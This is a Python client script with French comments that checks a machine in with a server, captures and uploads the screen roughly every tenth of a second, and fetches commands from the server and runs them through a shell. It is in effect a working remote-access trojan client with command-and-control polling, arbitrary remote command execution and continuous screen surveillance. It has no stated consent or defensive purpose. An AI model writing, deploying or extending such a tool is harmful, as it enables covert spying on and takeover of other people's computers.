import requests
import platform
import time
import subprocess
import os
from io import BytesIO
from PIL import ImageGrab

SERVER_URL = "http://127.0.0.1:5000" # Adaptez si votre serveur est ailleurs

def get_os_type():
    return platform.system()

def get_computer_name():
    return platform.node()

def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        return img_byte_arr
    except Exception as e:
        print(f"Erreur lors de la capture d'écran: {e}")
        return None

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout, result.stderr
    except Exception as e:
        return None, str(e)

def check_for_command(client_id):
    try:
        response = requests.get(f"{SERVER_URL}/client/{client_id}/getcommand") # Endpoint pour récupérer la commande
        if response.status_code == 200:
            data = response.json()
            if 'command' in data and data['command']:
                command_to_execute = data['command']
                print(f"Commande reçue du serveur: {command_to_execute}")
                stdout, stderr = execute_command(command_to_execute) # Exécuter la commande localement
                if stdout:
                    print("Sortie de la commande:")
                    print(stdout)
                if stderr:
                    print("Erreur de la commande:")
                    print(stderr)
                # Ici, vous pourriez potentiellement renvoyer le résultat de la commande au serveur si nécessaire
    except Exception as e:
        print(f"Erreur lors de la vérification des commandes: {e}")


def main():
    client_name = get_computer_name()
    os_type = get_os_type()

    # Enregistrement initial du client auprès du serveur
    checkin_data = {'name': client_name, 'os_type': os_type}
    try:
        response = requests.post(f"{SERVER_URL}/client/checkin", json=checkin_data)
        if response.status_code == 200:
            client_id_data = response.json()
            client_id = client_id_data.get('client_id')
            print(f"Client enregistré avec l'ID: {client_id}")
        else:
            print(f"Erreur lors du check-in initial: {response.status_code}")
            return
    except requests.exceptions.RequestException as e:
        print(f"Erreur de connexion au serveur lors du check-in: {e}")
        return

    if client_id is None: # S'assurer que client_id est bien défini
        print("ID client non obtenu, arrêt.")
        return

    while True:
        # Check-in régulier pour maintenir la connexion et signaler que le client est actif
        try:
            requests.post(f"{SERVER_URL}/client/checkin", json=checkin_data) # On refait le checkin pour mettre à jour le timestamp
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors du check-in régulier: {e}")


        # Capture d'écran et envoi au serveur (toutes les X secondes)
        # Capture d'écran et envoi au serveur (maintenant plus fréquemment)
        screenshot_data = capture_screenshot()
        if screenshot_data:
            try:
                files = {'screenshot': ('screenshot.png', BytesIO(screenshot_data), 'image/png')}
                response = requests.post(f"{SERVER_URL}/client/{client_id}/screenshot", files=files)
                if response.status_code != 200:
                    print(f"Erreur lors de l'envoi du screenshot: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Erreur de connexion lors de l'envoi du screenshot: {e}")

        # Vérification et exécution de commandes (toutes les Y secondes - ou moins fréquemment que le screenshot)
        check_for_command(client_id) # Fonction à implémenter côté client pour récupérer les commandes du serveur et les exécuter
        # check_for_command(client_id) # Fonction à implémenter côté client pour récupérer les commandes du serveur et les exécuter

        time.sleep(0.1) # Attendre 5 secondes avant la prochaine itération (ajustez ce délai)


if __name__ == "__main__":
    main()